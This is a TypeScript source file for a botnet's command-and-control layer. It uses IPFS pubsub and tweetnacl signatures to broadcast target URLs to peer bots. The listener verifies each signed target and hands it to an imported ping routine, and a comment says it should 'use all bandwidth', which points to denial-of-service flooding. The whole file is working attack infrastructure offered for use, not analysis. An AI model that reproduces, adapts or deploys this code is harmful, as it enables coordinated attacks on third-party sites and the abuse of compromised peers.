import * as IPFS from 'ipfs-core';
import pingL from './pingLogic';
// Load crpto tool tweetna-cl
import nacl from 'tweetnacl';
import naclUtil from 'tweetnacl-util';
// Load fs for key storing
import fs from 'fs';
import { exit } from 'process';
import { delay } from './utils';
// TUI stuff
const dots = ['.', '..', '...'];
const counter = {
  current: 0
};
const interval: { current: NodeJS.Timer | null} = {
  current: null,
};

/**
 * Listener logic
 * @param topic The topic where the messages will be recived
 */
export default async function pbL(topic: string) {
  const ipfs = await create_IPFS();
  const receiveMsg = (msg: { data: BufferSource | undefined; }) => 
    parse_incoming_text(new TextDecoder().decode(msg.data));
  await ipfs.pubsub.subscribe(topic, receiveMsg, {onError: on_IPFS_error});
  setInterval(async () => {
    const peers = (await ipfs.pubsub.peers(topic)).toString();
    process.stdout.clearLine(0);
    process.stdout.write(`Peers: [${peers}] \r`);
  }, 1000);
}

/**
 * Verify the incoming message 
 * @param payload Payload to verify
 */
const parse_incoming_text = (payload:string) => {
  console.log('Recived:', payload);
  const signedMessage = naclUtil.decodeBase64(payload);
  const publicKey = fs.readFileSync('pbkey.key').toString();
  const messageVerified = nacl.sign.open(
    signedMessage, 
    naclUtil.decodeBase64(publicKey)
  );
  if (messageVerified !== null) {
    // If the interval exists delete it to use all bandwidth
    if(interval.current === null) {
      interval.current = pingL(naclUtil.encodeUTF8(messageVerified));
    }
    clearInterval(interval.current);
    interval.current = pingL(naclUtil.encodeUTF8(messageVerified));
  } else {
    console.log('Failed to verify');
  }
};

/**
 * Send a url to the botnet
 * @param topic The topic witch the message will be sent to
 * @param payload The payload that will be sent
 */
const send_next_target = async (topic:string, payload:string) => {
  const privateKey = fs.readFileSync('pvkey.key').toString();
  const signedMessage = nacl.sign(
    naclUtil.decodeUTF8(payload),
    naclUtil.decodeBase64(privateKey)
  );
  const ipfs = await create_IPFS();
  const msg = new TextEncoder().encode(naclUtil.encodeBase64(signedMessage));
  console.log('Sending:', naclUtil.encodeBase64(signedMessage));
  // Subscribe to meet peers
  // eslint-disable-next-line @typescript-eslint/no-empty-function
  ipfs.pubsub.subscribe(topic, () => {});
  while((await ipfs.pubsub.peers(topic)).length === 0) {
    process.stdout.clearLine(0);
    // Create a cool animation . -> .. -> ... -> .
    process.stdout.write(`Looking for peers [${dots[counter.current % dots.length]}]\r`);
    counter.current++;
    // Dont kill the event loop
    await delay(1000);
  }
  await ipfs.pubsub.publish(topic, msg);
  console.log(payload, 'was sent to', topic);
  console.log('Waiting to quit...');
  await delay(5000); // gossipsub need this delay https://github.com/libp2p/go-libp2p-pubsub/issues/331
  // eslint-disable-next-line @typescript-eslint/no-empty-function
  await ipfs.pubsub.unsubscribe(topic, () => {});
  exit(0);
};

/**
 * List all peers subscribed to a topic
 * @param topic The topic from witch the peers will be taken
 */
const list_peers = async (topic:string) => {
  const ipfs = await create_IPFS();
  const peerIds = await ipfs.pubsub.peers(topic);
  console.log(peerIds);
  exit(0);
};

const on_IPFS_error = (err: Error) => {
  console.error(err);
};

/**
 * Creates a IPFS instance
 * @returns ipfs instance
 */
const create_IPFS = async () => {
  const ipfs = await IPFS.create({
    repo: 'ok' + Math.random(),
    config: {
      Addresses: {
        Swarm: [
          '/dns4/wrtc-star1.par.dwebops.pub/tcp/443/wss/p2p-webrtc-star/',
          '/dns4/wrtc-star2.sjc.dwebops.pub/tcp/443/wss/p2p-webrtc-star/',
          '/ip4/0.0.0.0/tcp/4002',
          '/ip4/127.0.0.1/tcp/4003/ws'
        ],
      },
      Bootstrap: [
        '/dns6/ipfs.thedisco.zone/tcp/4430/wss/p2p/12D3KooWChhhfGdB9GJy1GbhghAAKCUR99oCymMEVS4eUcEy67nt',
        '/dns4/ipfs.thedisco.zone/tcp/4430/wss/p2p/12D3KooWChhhfGdB9GJy1GbhghAAKCUR99oCymMEVS4eUcEy67nt'
      ],
    },
    relay: {
      enabled: true,
      hop: {
        enabled: true
      }
    },
    EXPERIMENTAL: {
      ipnsPubsub: true,
    }
  });
  return ipfs;
};

// Other exports
export {
  send_next_target,
  list_peers,
};
